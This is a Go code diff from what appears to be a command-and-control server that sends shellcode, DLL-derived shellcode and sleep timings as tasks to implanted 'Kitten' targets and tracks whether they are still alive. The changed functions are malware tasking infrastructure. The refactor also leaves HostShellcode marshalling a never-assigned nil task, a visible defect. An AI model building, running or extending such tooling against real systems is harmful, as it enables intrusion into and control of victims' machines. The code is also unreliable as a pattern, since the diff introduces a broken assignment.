@@ -16,7 +16,7 @@ var Targets map[string]*Kitten
 
 // HostShellcode Hosts the shellcode
 func HostShellcode(path string, kittenName string) error {
-	task := util.NewTask()
+	var task *util.Task
 	var err error
 	key := Targets[kittenName].GetKey()
 	sc, err := os.ReadFile(path)
@@ -26,13 +26,11 @@ func HostShellcode(path string, kittenName string) error {
 	contentType := http.DetectContentType(sc)
 	//checks if the file is a hex file
 	if contentType == "text/plain; charset=utf-8" {
-		task.SetTag("shellcode")
-		task.SetPayload(sc)
+		util.NewTask("shellcode", sc)
 		// check if the file is a binary
 	} else if contentType == "application/octet-stream" {
 		hexstring := fmt.Sprintf("%x ", sc)
-		task.SetTag("shellcode")
-		task.SetPayload([]byte(hexstring))
+		util.NewTask("shellcode", []byte(hexstring))
 	}
 	payload, err := json.Marshal(task)
 	if err != nil {
@@ -50,10 +48,8 @@ func HostShellcode(path string, kittenName string) error {
 // HostSleep Hosts the sleep time the same way as the shellcode
 func HostSleep(t int, kittenName string) error {
 	Targets[kittenName].SetSleep(t)
-	task := util.NewTask()
+	task := util.NewTask("sleep", []byte(fmt.Sprintf("%d", t)))
 	key := Targets[kittenName].GetKey()
-	task.SetTag("sleep")
-	task.SetPayload([]byte(fmt.Sprintf("%d", t)))
 	payload, err := json.Marshal(task)
 	if err != nil {
 		return err
@@ -69,7 +65,6 @@ func HostSleep(t int, kittenName string) error {
 
 // HostDll Hosts the shellcode converted dll
 func HostDll(path, entry, kittenName string) error {
-	task := util.NewTask()
 	var err error
 	key := Targets[kittenName].GetKey()
 	dll, err := os.ReadFile(path)
@@ -81,8 +76,7 @@ func HostDll(path, entry, kittenName string) error {
 		return err
 	}
 	hexstring := fmt.Sprintf("%x ", sc)
-	task.SetTag("shellcode")
-	task.SetPayload([]byte(hexstring))
+	task := util.NewTask("shellcode", []byte(hexstring))
 	payload, err := json.Marshal(task)
 	if err != nil {
 		return err
@@ -103,7 +97,6 @@ func CheckAlive() {
 		time.Sleep(1 * time.Second)
 		for name, x := range Targets {
 			if Targets[name].Alive {
-				//t := time.Now().Sub(x.GetLastSeen())
 				t := time.Since(x.GetLastSeen())
 				sleepTime := time.Duration(x.GetSleep()) * time.Second
 				if t > sleepTime+5*time.Second {
